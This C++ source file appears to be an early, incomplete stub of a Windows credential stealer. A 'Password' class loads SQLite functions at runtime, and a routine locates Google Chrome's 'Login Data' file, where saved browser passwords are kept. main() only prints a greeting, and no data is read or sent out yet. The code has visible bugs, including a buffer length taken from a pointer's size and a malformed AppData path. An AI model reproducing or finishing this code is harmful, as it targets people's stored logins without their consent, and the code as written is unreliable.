#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <ShlObj.h>
#include <Shlwapi.h>
#include <strsafe.h>

int main()
{
    std::cout << "Hello World!\n";
}

class Password
{
private:
	HMODULE sqliteModule;
	FARPROC sqlite_open_v2;
	FARPROC sqlite_prepare_v2;
	FARPROC sqlite_step;
	FARPROC sqlite_column_step;
	FARPROC sqlite_column_bytes;
public:
	Password()
	{
	//if (this->sqliteModule == 0x0 || this->sqlite_open_v2 == 0x0 || this->sqlite_prepare_v2 == 0x0 || this->sqlite_step == 0x0 || this->sqlite_column_step == 0x0 || this->sqlite_column_bytes == 0x0)
			printf("[PasswordConstructor]: Fetching functions from sqlite3.dll\n");
			this->sqliteModule = LoadLibraryW(L"sqlite3.dll");
			this->sqlite_open_v2 = GetProcAddress(this->sqliteModule, "sqlite3_open_v2");
		
	}
};

void OpenLoginData()
{
	// Location
	// C:\Users\<uname>\AppData\Local\Google\Chrome\User Data\Default
	LPWSTR folderPath;
	folderPath = (LPWSTR)malloc(1024);

	if (folderPath == nullptr)
	{
		printf("[MALLOC] Error in folderPath\n");
		exit(0);
	}

	SHGetSpecialFolderPathW(NULL, folderPath, CSIDL_PROFILE, false);

	printf("[LoginData]: %ls\n", folderPath);

	if (StringCchCatW(folderPath, sizeof(folderPath), L"\\Local\\Google\\Chrome\\User Data\\Default\\Login Data") != S_OK)
	{
		printf("[StringCchCatW] Error concatenating string...\n");
		exit(0);
	}
	//folderPath = lstrcatnW(folderPath, L"\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", sizeof(folderPath));

	if (!PathFileExistsW(folderPath))
	{
		printf("[Chrome] Login Data doesn't exist...\n");
		exit(0);
	}

	free(folderPath);
}